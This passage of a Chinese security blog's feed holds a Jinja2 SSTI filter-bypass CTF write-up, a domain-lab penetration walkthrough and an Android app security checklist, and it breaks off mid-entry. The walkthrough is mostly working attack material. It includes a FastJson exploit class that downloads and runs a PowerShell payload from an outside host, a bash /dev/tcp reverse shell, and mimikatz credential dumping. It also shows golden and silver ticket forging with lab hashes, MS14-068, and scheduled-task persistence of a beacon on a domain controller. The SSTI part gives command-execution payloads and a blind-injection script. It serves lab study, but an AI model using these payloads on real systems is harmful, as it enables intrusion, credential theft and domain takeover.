class="language-none">&#123;&#123;(((request|attr(request.args.f|format(request.args.h,request.args.h,request.args.a,request.args.h,request.args.h))|attr(request.args.f|format(request.args.h,request.args.h,request.args.b,request.args.h,request.args.h))|list).pop(-1)|attr(request.args.f|format(request.args.h,request.args.h,request.args.c,request.args.h,request.args.h))()).pop(118)|attr(request.args.f|format(request.args.h,request.args.h,request.args.d,request.args.h,request.args.h))|attr(request.args.f|format(request.args.h,request.args.h,request.args.e,request.args.h,request.args.h))).get(&#39;popen&#39;)(&#39;cat%20Th1s_is_F1114g&#39;).read()&#125;&#125;&amp;f&#x3D;%s%s%s%s%s&amp;h&#x3D;_&amp;a&#x3D;class&amp;b&#x3D;mro&amp;c&#x3D;subclasses&amp;d&#x3D;init&amp;e&#x3D;globals <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150534.png" alt="image-20200423163319930"></p><h4 id="flask-魔改"><a href="#flask-魔改" class="headerlink" title="flask 魔改"></a>flask 魔改</h4><p>如果禁用<code>{{ }}</code>这种符号，同时保持上面符号的禁用。默认的Jinja分隔符配置如下：</p><pre class="line-numbers language-none"><code class="language-none">&#123;% ... %&#125;用于声明&#123;&#123; ... &#125;&#125;用于将表达式打印到模板输出&#123;# ... #&#125;用于注释不包括在模板输出#  ... ##用于行语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用if的逻辑语句，由于不能直接用表达式打印，所以用以下布尔判断，循环pop中的值，得到334</p><pre class="line-numbers language-none"><code class="language-none">&#123;%%20if%20((request|attr((&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;mro&quot;,&quot;_&quot;*2)|join)|list).pop(-1)|attr((&quot;_&quot;*2,&quot;subclasses&quot;,&quot;_&quot;*2)|join)()).pop(334)|string&#x3D;&#x3D;&quot;&lt;class%20&#39;os._wrap_close&#39;&gt;&quot;%20%&#125;111&#123;%%20endif%20%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150536.png" alt="image-20200424105108660"></p><p>但是最后获取的时候，需要对字符串进行截取，切片已经不能使用了，只能从字符串的方法中查找，可用的恰好有<code>index</code>，<code>find</code>，可以指定范围查找，比如<code>index</code>，指定范围从0开始，结束为1，如果为指定字符串返回正常，不然返回异常。</p><pre class="line-numbers language-none"><code class="language-none">&#123;%%20if%20((((request|attr((&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;mro&quot;,&quot;_&quot;*2)|join)|list).pop(-1)|attr((&quot;_&quot;*2,&quot;subclasses&quot;,&quot;_&quot;*2)|join)()).pop(334)|attr((&quot;_&quot;*2,&quot;init&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;globals&quot;,&quot;_&quot;*2)|join)).get(&#39;popen&#39;)(&#39;cat%20Th1s_is_F1114g&#39;).read()|string).index(&#39;n&#39;,0,1)%20%&#125;&#123;%%20endif%20%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用类似如下的盲注脚本</p><pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-import requestsdef check(payload):    url &#x3D; &#39;http:&#x2F;&#x2F;x.x.x.x:19009&#x2F;user?name&#x3D;&#39;+payload    r &#x3D; requests.get(url)    if r.status_code &#x3D;&#x3D; 200:        return Truepassword  &#x3D; &#39;&#39;s &#x3D; &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$()&lt;&#x3D;&gt;&#123;|&#125;_&#39;for i in range(0,40):    for c in s:        payload &#x3D; &#39;&#123;%%20if%20((((request|attr((&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;mro&quot;,&quot;_&quot;*2)|join)|list).pop(-1)|attr((&quot;_&quot;*2,&quot;subclasses&quot;,&quot;_&quot;*2)|join)()).pop(334)|attr((&quot;_&quot;*2,&quot;init&quot;,&quot;_&quot;*2)|join)|attr((&quot;_&quot;*2,&quot;globals&quot;,&quot;_&quot;*2)|join)).get(&quot;popen&quot;)(&quot;cat%20Th1s_is_F1114g&quot;).read()|string).index(&quot;&#39;+c+&#39;&quot;,&#39;+str(i)+&#39;,&#39;+str(i+1)+&#39;)%20%&#125;&#123;%%20endif%20%&#125;&#39;         if check(payload):            password +&#x3D; c            break    print(password)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150543.png" alt="image-20200424120151112"></p><h4 id="flask-究极改"><a href="#flask-究极改" class="headerlink" title="flask 究极改"></a>flask 究极改</h4><p>在把<code>join</code>禁掉，还有<code>format</code>，把<code>values</code>和<code>args</code>也禁掉，不能从其他参数获取，这样上面的绕过就算是不能用了。</p><pre class="line-numbers language-none"><code class="language-none">blacklist &#x3D; [&#39;__class__&#39;,&#39;__&#39;,&#39;[&#39;,&#39;]&#39;,&#39;join&#39;,&#39;values&#39;,&#39;args&#39;,&#39;format&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查找一个request有关系的属性，尝试<code>form</code>，比如支持POST方法的话。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150545.png" alt="image-20200424132808887"></p><p>利用cookie参数</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150547.png" alt="image-20200424133033655"></p><p>利用请求头</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150549.png" alt="image-20200424133405205"></p><p>连起来就是，获取object子类。</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;((request|attr(request.cookies.get(&#39;aa&#39;))|attr(request.cookies.get(&#39;bb&#39;))|list).pop(-1))|attr(request.cookies.get(&#39;cc&#39;))()&#125;&#125;Cookie: aa&#x3D;__class__;bb&#x3D;__mro__;cc&#x3D;__subclasses__<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150550.png" alt="image-20200424140101732"></p><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><p>在flask plus中，采用的是session对象来解决问题，虽然在上一题中采用的是元组对象，但是只是因为其中没有禁用join，如果在plus中也禁用了session，还能怎么处理。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150552.png" alt="image-20200424141236793"></p><p>但实际并没有这么理想</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150555.png" alt="image-20200424145056229"></p><p>这里面能采用的还有哪些，比如</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;(((redirect|attr(&#39;__cla&#39;+&#39;ss__&#39;)|attr(&#39;__mr&#39;+&#39;o__&#39;)|list)[-1]|attr(&#39;__subcla&#39;+&#39;sses__&#39;)())[342]|attr(&#39;__in&#39;+&#39;it__&#39;)|attr(&#39;__globals__&#39;))[&#39;pop&#39;+&#39;en&#39;](&#39;cat%20&#x2F;Th1s_is_F1114g&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200424150557.png" alt="image-20200424145127596"></p><p>如果<code>attr</code>被禁用，这种也不能使用，或者能使用<code>__getattribute__</code>替代，但是原代码里已经禁用了。</p><p>文章参考：<a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93">Python沙箱逃逸总结</a>，<a href="https://xz.aliyun.com/t/52">Python沙箱逃逸的n种姿势</a>，<a href="https://www.freebuf.com/articles/system/203208.html">一文看懂Python沙箱逃逸</a>，<a href="https://xz.aliyun.com/t/288">Python格式化字符串漏洞</a>，<a href="https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw">一文掌握CTF中Python全部考点</a>，<a href="https://0day.work/jinja2-template-injection-filter-bypasses/">Jinja2 template injection filter bypasses</a>，<a href="https://p0sec.net/index.php/archives/120/">Flask/Jinja2模板注入中的一些绕过姿势</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;沙箱逃逸概述&quot;&gt;&lt;a href=&quot;#沙箱逃逸概述&quot; class=&quot;headerlink&quot; title=&quot;沙箱逃逸概述&quot;&gt;&lt;/a&gt;沙箱逃逸概述&lt;/h2&gt;&lt;p&gt;沙箱逃逸就是在在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的
      
    
    </summary>
    
    
      <category term="python" scheme="https://misakikata.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>域靶场WP</title>
    <link href="https://misakikata.github.io/2020/04/%E5%9F%9F%E9%9D%B6%E5%9C%BAWP/"/>
    <id>https://misakikata.github.io/2020/04/域靶场WP/</id>
    <published>2020-04-10T08:31:54.000Z</published>
    <updated>2020-04-10T08:32:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>域环境利用已有靶场，简单方便<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p><p>web环境漏洞FastJson。利用<a href="https://github.com/RealBearcat/FastJson-JdbcRowSetImpl-RCE">https://github.com/RealBearcat/FastJson-JdbcRowSetImpl-RCE</a> 修改而来</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114455.png" alt="image-20200407153757538"></p><p>参数为json字符串，可以简单的使用如下探测是否存在问题。</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>比如，此处使用burp的DNS监听</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114500.png" alt="image-20200407140108169"></p><p>执行后会发现，说明存在问题。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114502.png" alt="image-20200407140121264"></p><p>至于版本，可以在一般测试中，构造错误的json字符串查看报错信息，但此处没有错误显示，直接使用几个较高版本的POC测试。</p><p>此处直接使用47的POC，由于是Windows系统，则利用cs使用powershell来反弹shell。</p><pre class="line-numbers language-none"><code class="language-none">import java.lang.Runtime;import java.lang.Process;public class Exploit &#123;    public Exploit()&#123;        try&#123;            &#x2F;&#x2F; Runtime.getRuntime().exec(&quot;&#x2F;bin&#x2F;bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.120.130&#x2F;8888&lt;&amp;1&quot;);            Runtime.getRuntime().exec(&quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(\&#39;http:&#x2F;&#x2F;192.168.120.130:80&#x2F;a\&#39;))\&quot;&quot;);        &#125;catch(Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public static void main(String[] argv)&#123;        Exploit e &#x3D; new Exploit();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行后，在cs端就可以收到shell了。利用ms15-051提权，提权模块可能是添加的插件。获得system权限。还可以看到存在一个内网地址10.10.10.80。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114504.png" alt="image-20200408095902201"></p><p>利用mimikatz获取密码，只能读取到当前登陆账号的明文密码。</p><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114506.png" alt="image-20200408134439940"></p><p>不过如果使用了管理员账号来执行操作修改配置，也可以读取到管理员hash。如果使用明文密码登陆修改就可以抓到。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114508.png" alt="image-20200408151440720"></p><p>如果提示报错，尝试修改注册表</p><pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>收集信息可知以下信息</p><pre class="line-numbers language-none"><code class="language-none">域名：DC.de1ay.com域主机：10.10.10.10域用户：Administrator，delay,mssql域管理员：Administrator两个网卡：192.168.120.0&#x2F;24，10.10.10.0&#x2F;24主机：存在两个主机(192.168.120.201，10.10.10.10)存在360主机防御系统，不过并没有干涉<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114510.png" alt="image-20200408100546410"></p><p>尝试利用de1ay用户来登陆PC，利用psexec登陆不成功。</p><p>使用psexec登陆，DC机显示成功但是没有获得shell，可能是没成功把</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114512.png" alt="image-20200408155334127"></p><p>然后利用net共享，先用mimikatz生成pth凭据。</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::pth &#x2F;domain:. &#x2F;user:Administrator &#x2F;ntlm: 70be8675cd511daa9be4b8f49e829327<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>net和psexec的时候还是不成功，报错。利用cs自身的pth模块执行，还是报错，拒绝访问</p><pre class="line-numbers language-none"><code class="language-none">pth DE1AY\de1ay 161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114514.png" alt="image-20200408163645027"></p><p>再尝试利用金票，直接登陆到主机上，上传mimikatz执行。</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:de1ay.com &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114515.png" alt="image-20200409164051760"></p><p>得到HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi  </p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:administrator &#x2F;domain:de1ay.com &#x2F;sid:S-1-5-21-2756371121-2868759905-3853650604 &#x2F;krbtgt:82dfc71b72a11ef37d663047bc2088fb &#x2F;ticket:golden.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114517.png" alt="image-20200409164616356"></p><p>通过mimikatz中的kerberos::ptt将golden.kiribi导入内存中 </p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge   &#x2F;&#x2F;删除票据kerberos::ptt golden.kiribi  &#x2F;&#x2F;导入票据kerberos::list  &#x2F;&#x2F;查看票据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114519.png" alt="image-20200409164906689"></p><p>查看DC域主机默认共享，可以连接到域主机，上传文件执行。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114520.png" alt="image-20200409165120018"></p><p>先利用域内主机创建一个端口转发，先创建一个dns的监听，然后利用已有shell。再去创建一个listener。如下dc。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114522.png" alt="image-20200409172526385"></p><p>或者直接利用已有shell来创建listener，再生成exe。利用dc监听来生成exe</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114524.png" alt="image-20200409172758964"></p><p>利用<code>copy beacon.exe \\DC.de1ay.com\c$\Users\de1ay\</code>到DC主机上</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114526.png" alt="image-20200409170358135"></p><p>创建计划任务执行后门，很快就有DC主机上线了。</p><pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;create &#x2F;s DC.de1ay.com &#x2F;ru &quot;SYSTEM&quot; &#x2F;tn testdc &#x2F;sc DAILY &#x2F;tr C:\\Users\\de1ay\\beacon.exe &#x2F;Fschtasks &#x2F;run &#x2F;s DC.de1ay.com &#x2F;tn testdc &#x2F;i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114527.png" alt="image-20200409173044533"></p><p>对于用户PC机，同样可以利用金票来执行，后面的操作和上面类似。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114529.png" alt="image-20200409174013572"></p><p>最后就可以获得shell。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114530.png" alt="image-20200409174748884"></p><p>再尝试使用银票，生成前删除全部票据，不能访问。</p><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114532.png" alt="image-20200410090753302"></p><p>这里使用de1ay的hash</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114534.png" alt="image-20200410091300403"></p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;domain:de1ay.com &#x2F;sid:S-1-5-21-2756371121-2868759905-3853650604 &#x2F;target:DC.de1ay.org &#x2F;service:cifs &#x2F;rc4:161cff084477fe596a5db81874498a24 &#x2F;user:de1ay &#x2F;ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里使用/ptt直接导入内存，或者先生成票据，再使用上面的kerberos::ptt导入内存。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114536.png" alt="image-20200410091815717"></p><p>查看是否可以访问</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114538.png" alt="image-20200410091924771"></p><p>同样shell以后可以看到是个用户权限</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114540.png" alt="image-20200410092340435"></p><p>在尝试使用ms14-068，DC机是Windows2012，没有补丁KB3011780，同样删除票据</p><p>由于主机上没有python环境，pykek不能使用，暂时没有exe版本的pykek。下载使用编译完成的exe文件</p><p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p><pre class="line-numbers language-none"><code class="language-none">ms14-068.exe -u de1ay@de1ay.com -s S-1-5-21-2756371121-2868759905-3853650604 -d DC.de1ay.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成cache缓存文件，再使用mimikatz来导入</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptc TGT_de1ay@de1ay.com.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114542.png" alt="image-20200410100442974"></p><p>不过回过头看，之前在cs中执行利用psexec和已有凭据执行psh的时候应该是成功的。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410114544.png" alt="image-20200410113800119"></p><p>执行后在DC上会有短暂的ps调用显示，但至于为啥没有回显和连接，也许是连接错误。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;域环境利用已有靶场，简单方便&lt;a href=&quot;http://vulnstack.qiyuanxuetang.net/vuln/detail/3/&quot;&gt;http://vulnstack.qiyuanxuetang.net/vuln/detail/3/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;we
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>APP应用安全检测</title>
    <link href="https://misakikata.github.io/2020/04/APP%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B/"/>
    <id>https://misakikata.github.io/2020/04/APP应用安全检测/</id>
    <published>2020-04-10T08:30:24.000Z</published>
    <updated>2020-04-10T08:30:33.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="测试说明"><a href="#测试说明" class="headerlink" title="测试说明"></a>测试说明</h2><p>测试内容根据绿盟APP测试流程进行检查，APP是前几年谷歌CTF的中的APK。</p><h2 id="客户端安全"><a href="#客户端安全" class="headerlink" title="客户端安全"></a>客户端安全</h2><h3 id="安装包签名"><a href="#安装包签名" class="headerlink" title="安装包签名"></a>安装包签名</h3><pre class="line-numbers language-none"><code class="language-none">jarsigner.exe -verify WhyShouldIPay.apk -verbose -certs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出结果为“jar 已验证”时，表示签名正常。  </p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162840.png" alt="image-20200410140458826"></p><h3 id="程序保护"><a href="#程序保护" class="headerlink" title="程序保护"></a>程序保护</h3><p>此处使用jadx打开APK，若软件使用混淆好加壳则不存在问题。如下打开后是下面这种，则是没添加保护。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162841.png" alt="image-20200410140922318"></p><h3 id="应用完整性检测"><a href="#应用完整性检测" class="headerlink" title="应用完整性检测"></a>应用完整性检测</h3><p>反编译APK，修改其中的res资源文件，把其中的一个图片替换为其他图片</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162843.png" alt="image-20200410141438100"></p><p>如果完整性是检查MANIFEST.MF 中的数据则存在风险。若回编译后安装使用正常，则代表无检查。</p><h3 id="组件安全"><a href="#组件安全" class="headerlink" title="组件安全"></a>组件安全</h3><p>主要查看是否存在<code>android:exported=&quot;true&quot;</code>属性的组件，存在属性的组件可以被第三方导出。但是部分组件需要被调用来执行，比如组件中存在<code>&lt;intent-filter&gt;</code>过滤器。这种组件就相当于允许导出。</p><p>根据不同的要求这种情况不一定算是风险项。比如此activity组件，由于是首启动页。需要被调用执行，也就不存在上面所说的不允许被导出情况。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162846.png" alt="image-20200410144025704"></p><h3 id="webview组件安全"><a href="#webview组件安全" class="headerlink" title="webview组件安全"></a>webview组件安全</h3><p>Android 4.2 版本以下的 webview 组件存在安全漏洞 ，检测本地是否会被利用的方式是允许运行的sdk最小不能低于17，来避免在受影响的手机上使用。</p><p><img src="APP%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B.assets/image-20200410144355967.png" alt="image-20200410144355967"></p><h2 id="敏感信息安全"><a href="#敏感信息安全" class="headerlink" title="敏感信息安全"></a>敏感信息安全</h2><h3 id="数据文件"><a href="#数据文件" class="headerlink" title="数据文件"></a>数据文件</h3><p>查看安装app目录文件权限是否为<code>rw-rw----  </code>当前用户可读性模式。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162847.png" alt="image-20200410145303695"></p><p>如果文件目录下存在database目录，db类型的文件，说明使用本地数据库，查看数据文件是否有明文敏感信息。</p><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><p>查看日志文件中是否输出了一些敏感信息，比如账号密码，认证session等</p><p>可以通过adb命令查看，也可以使用第三方连接软件查看<code>adb logcat</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162849.png" alt="image-20200410145927703"></p><h2 id="密码键盘安全性"><a href="#密码键盘安全性" class="headerlink" title="密码键盘安全性"></a>密码键盘安全性</h2><h3 id="屏幕录像"><a href="#屏幕录像" class="headerlink" title="屏幕录像"></a>屏幕录像</h3><p>这种问题从测过的软件和客户来看，在意的程度不高，可能也就在银行金融类APP上会比较在意。</p><p>比如利用adb截图来测试是否可以对屏幕进行记录<code>adb shell /system/bin/screencap -p /path/a.png</code></p><p>如果打开后，可以看到输入的数据，或者可以看到键盘点击反馈则算安全问题。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162850.png" alt="image-20200410151346239"></p><h3 id="随机键盘"><a href="#随机键盘" class="headerlink" title="随机键盘"></a>随机键盘</h3><p>这种目前只在银行APP支付的时候输入银行卡密码的时候存在，一般APP并没有此要求。可以根据情况来确定是否需要检测此项。</p><h2 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h2><h3 id="密码复杂度"><a href="#密码复杂度" class="headerlink" title="密码复杂度"></a>密码复杂度</h3><p>APP登陆的密码一般要求大小写字母和数字，需要其中两种以上，不少于八位。如果允许使用纯数字或者纯字母，且长度没有要求的情况下，则存在问题。</p><h3 id="账号登陆限制"><a href="#账号登陆限制" class="headerlink" title="账号登陆限制"></a>账号登陆限制</h3><p>根据业务需要，是否允许同一个账号多设备登陆同时操作，如果不允许则尝试多设备登陆，登陆正常使用则存在问题。</p><h3 id="账号锁定机制"><a href="#账号锁定机制" class="headerlink" title="账号锁定机制"></a>账号锁定机制</h3><p>账号可能存在被爆破密码的可能，在有些不适合使用验证码的场景下，对账号执行登陆错误次数的限制是可以有效防止账号被暴力破解的方式之一。</p><h3 id="验证码安全性"><a href="#验证码安全性" class="headerlink" title="验证码安全性"></a>验证码安全性</h3><p>查看使用的验证码是否能被简单识别，使用能正常使用和防止登陆中被多次验证的问题</p><h3 id="安全退出"><a href="#安全退出" class="headerlink" title="安全退出"></a>安全退出</h3><p>账号在登陆退出后，查看是否正确的注销session。利用原session是否还可以请求到数据。</p><h3 id="密码修改验证"><a href="#密码修改验证" class="headerlink" title="密码修改验证"></a>密码修改验证</h3><p>验证修改密码的功能是否存在问题，是否需要原密码判断，修改的复杂度等是否符合要求</p><h3 id="activity-界面劫持"><a href="#activity-界面劫持" class="headerlink" title="activity 界面劫持"></a>activity 界面劫持</h3><p>如果攻击者注册一个receiver，响应android.intent.action.BOOT_COMPLETED，使得开启启动一个service；在这个service中启动一个计时器，不停枚举当前进程中是否有预设的进程启动，如果发现有预设进程，则使用FLAG_ACTIVITY_NEW_TASK启动自己的钓鱼界面，而正常应用的界面则隐藏在钓鱼界面的后面。</p><p>比如使用<a href="https://github.com/abigbread/Hijack%E6%9D%A5%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAapk%E3%80%82%E5%BE%AA%E7%8E%AF%E7%9B%91%E5%90%AC%E8%AE%BE%E7%BD%AE%E5%A5%BD%E7%9A%84app%E3%80%82">https://github.com/abigbread/Hijack来创建一个apk。循环监听设置好的app。</a></p><h2 id="进程防护"><a href="#进程防护" class="headerlink" title="进程防护"></a>进程防护</h2><h3 id="动态注入"><a href="#动态注入" class="headerlink" title="动态注入"></a>动态注入</h3><p>可以利用成熟的HOOK框架来尝试，比如使用xpose，在对于进程文件中，查看maps文件。其中可以看到对于的xpose文件</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162854.png" alt="image-20200410155352701"></p><p>或者使用Frida来加载其中的所有的类，查看是否正常获取。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200410162856.png" alt="image-20200410161814489"></p><h2 id="通信安全"><a href="#通信安全" class="headerlink" title="通信安全"></a>通信安全</h2><h3 id="通信加密"><a href="#通信加密" class="headerlink" title="通信加密"></a>通信加密</h3><p>这种更像是web漏洞，主要查看是否使用了https加密流量，并且是否有正确的证书配置。加密算法是否在TLSv1.1以上。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;测试说明&quot;&gt;&lt;a href=&quot;#测试说明&quot; class=&quot;headerlink&quot; title=&quot;测试说明&quot;&gt;&lt;/a&gt;测试说明&lt;/h2&gt;&lt;p&gt;测试内容根据绿盟APP测试流程进行检查，APP是前几年谷歌CTF的中的APK。&lt;/p&gt;
&lt;h2 id=&quot;客户端安全&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Spring 框架漏洞集合</title>
    <link href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/"/>
    <id>https://misakikata.github.io/2020/04/Spring-框架漏洞集合/</id>
    <published>2020-04-01T05:18:10.000Z</published>
    <updated>2020-04-01T05:18:10.000Z</updated>
    
